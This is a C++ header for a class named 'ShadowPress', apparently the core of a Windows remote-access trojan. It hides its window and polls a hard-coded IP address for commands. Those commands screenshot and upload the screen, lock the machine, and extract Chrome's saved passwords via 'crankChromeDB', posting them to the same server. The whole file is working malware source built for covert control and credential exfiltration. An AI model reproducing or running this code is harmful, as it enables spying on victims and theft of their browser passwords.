#pragma once
#include <iostream>
#include <Windows.h>
#include "Commands.h"
#include <winhttp.h>
#include "HttpRequest.h"
#include <atlstr.h>
#include <fstream>
#include <chrono>
#include <map>
#include <thread>
#include "asc2art.h"
#include "debinaryData.h"
#include <Mmsystem.h>
#include <mciapi.h>

class ShadowPress final
{
    const std::string ip = "194.67.87.25";
    std::string userDirectory;
    std::string documents;

    bool exit = false;
    std::map<std::string, std::function<void()>> commands = {
        {
            "screen", [&]()
            {
                Commands::saveScreenshot(documents + "\\out.jpg");
                Commands::postFile(ip, documents + "\\out.jpg", "image");
            }
        },
        {
            "lock", [&]()
            {
                LockWorkStation();
            }
        },
        {
            "show", [&]()
            {
                Commands::show();
            }
        },
        {
            "hide", [&]()
            {
                Commands::hide();
            }
        },
        {
            "sound1", [&]()
            {
                Commands::playSound("SystemStart");
            }
        },
        {
            "minimise", [&]()
            {
                Commands::minimiseAll();
            }
        },
        {
            "openWebPage", [&]()
            {
                Commands::openPage("https://www.youtube.com/watch?v=I4moygbhKzo&list=PLQIb2SvJgVs0_LsVcLfrH_3NREeSsfdwy&index=15");
            }
        },
        {
            "getDB", [&]()
            {
                //std::string path = userDirectory + "\\AppData\\Local\\Google\Chrome\\User Data\\Default\\Login Data";
                //Commands::copy(path, userDirectory + "\\Documents\\Login Data");
                //Commands::postFile(ip, userDirectory + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "db");
                Commands::crankChromeDB();
                Commands::postFile(ip, userDirectory + "\\Downloads\\passw", "db");
            }
        },
        {
            "exit", [&]()
            {
            	//sometimes it's time to stop
                exit = true;
            }
        }
    };

    void initUserDir()
    {
        wchar_t userDir[1000];

        GetEnvironmentVariable(L"USERPROFILE", userDir, sizeof(userDir));
        documents = std::string(CW2A(userDir)) + std::string("\\Downloads");
        userDirectory = std::string(CW2A(userDir));
    }
public:
    int cooldown = 400;
	ShadowPress()
	{
        Commands::hide();

        initUserDir();

        std::cout << Art::logo;
        std::cout << Art::noPanic;
	}
	void mainLoop()
	{
        Commands::hide();
        while (!exit)
        {
            HTTPRequest::getRequest(ip, [&](std::string responce)
                {
                    if (commands.find(responce) != commands.end())
                        commands[responce]();
                }, "command");
            std::this_thread::sleep_for(std::chrono::milliseconds(cooldown));
        }
	}
};